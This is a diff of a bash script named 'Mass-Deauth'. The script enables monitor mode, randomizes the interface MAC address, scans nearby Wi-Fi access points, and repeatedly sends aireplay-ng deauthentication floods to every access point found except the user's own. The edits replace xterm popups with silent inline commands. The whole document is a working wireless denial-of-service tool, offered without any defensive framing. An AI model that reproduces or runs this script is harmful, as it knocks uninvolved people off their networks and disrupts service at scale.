@@ -14,7 +14,7 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 ########################### LET'S ALSO CHECK FOR REQUIRED PROGRAMS
-for i in xterm airmon-ng aireplay-ng iw ip iwlist macchanger; do
+for i in airmon-ng aireplay-ng iw ip iwlist macchanger; do
 	command -v $i > /dev/null 2>&1 || {
 		echo -e >&2 "\033[31m\n    [!] This script requires $i to be installed. Aborting . . . [!]\033[0m\n"
 		sleep 1; exit 1
@@ -27,7 +27,7 @@ atk="0"
 MIFACE="mon0"
 
 clear
-echo -e "\e[01;32m[+]\e[00m Setting up for attack..."
+echo -e "\e[01;32m[+]\e[00m Setting up for attack . . ."
 
 while [[ ! $WIFACE ]]; do
 	echo -e "\033[33m[>] Type the wireless interface you'd like to use and hit [ENTER]:\033[0m"
@@ -57,47 +57,47 @@ function rmlogs() {
 	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
 }
 function cleanup() {
-	xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Killing deauths..." -e "killall -9 aireplay-ng"
+	echo -e "\n\n\033[31m[!] Killing aireplay-ng and $MIFACE . . .\033[0m"
+	killall -9 aireplay-ng &> /dev/null
 	airmon-ng stop $MIFACE
+	echo -e "\033[31m[!] Removing logs and scan data . . .\033[0m\n"
 	rmlogs
+	echo -e "\033[32m    [!] Happy Hacking! [!]\033[0m\n"
 	exit 0
 }
 
 trap cleanup INT
-ip link set $WIFACE up
+ip link set $WIFACE up &> /dev/null
 rmlogs
-xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
 while [[ ! $moncheck ]]; do
-	moncheck=`iw dev | grep $MIFACE | awk '$0 ~ /Interface / {print $2}'`
-	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "ip link set $WIFACE up && airmon-ng start $WIFACE"
-	moncheck=`iw dev | grep $MIFACE | awk '$0 ~ /Interface / {print $2}'`
+	ip link set $WIFACE up && airmon-ng start $WIFACE &> /dev/null
+	moncheck=`iw dev | awk '$0 ~ /Interface / {print $2}' | grep $MIFACE`
 done
 
-echo -e "\e[01;32m[+]\e[00m Changing MAC Address..."
-xterm -geometry 75x8+100+0 -T "Mass-Deauth v$version - Changing MAC Address of $MIFACE" -e "ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up; sleep 3" &
+echo -e "\e[01;32m[+]\e[00m Changing MAC Address . . ."
+ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up
+
 scan1="0"
 
 while true; do
-	curLine="1"
-	x="1"
-	echo -e "\n\e[01;33m[!] Press [ CTRL+C ]  in this window to kill attack...\e[00m\n"
-	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
+	echo -e "\n\e[01;33m[!] Press [ CTRL+C ]  in this window to kill attack . . .\e[00m\n"
 	rmlogs
 	iwlist $WIFACE scan > /tmp/scan.tmp
-	sleep 3
 	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$ourAPmac'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
 	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
 	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
-	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
-	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
-	echo -e "\e[01;32m[>]\e[00m Deauthenticating $lineNum APs from scan data..."
+	echo -e "\e[01;32m[>]\e[00m Deauthenticating $lineNum APs from scan data . . ."
 	for (( b=1; b<=$lineNum; b++ )); do
 			scan1="1"
-			curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
-			echo -e "\e[01;32m[>]\e[00m Deauthenticating all clients on $curAP ..."
-			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
-			curLine=$(($curLine+$x))
+			curCHAN=`cat /tmp/APchannels.lst | head -n $b`
+			curAP=`sed -n -e ''$b'p' '/tmp/APmacs.lst'`
+			echo -e "\e[01;32m[>]\e[00m Deauthenticating all clients on $curAP . . ."
+			aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE &> /dev/null &
 	done
 	atk="1"
+	echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds . . .\n" && sleep $waitTime
+	for active in `jobs -p`; do
+		wait $active
+	done
 done
